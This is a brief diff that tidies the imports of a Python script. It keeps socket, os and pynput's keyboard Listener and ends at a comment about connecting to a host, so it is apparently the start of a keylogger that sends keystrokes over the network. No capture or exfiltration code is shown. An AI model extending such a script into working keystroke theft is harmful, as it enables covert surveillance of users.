@@ -1,11 +1,5 @@
-
-from ossaudiodev import SNDCTL_DSP_SPEED
-import socket
 import os
-from ssl import ALERT_DESCRIPTION_UNKNOWN_CA
-from tkinter.filedialog import asksaveasfile
-from hamcrest import contains
-from numpy import asscalar
+import socket
 from pynput.keyboard import Key, Listener
 
 # Create Socket and Connect to Host
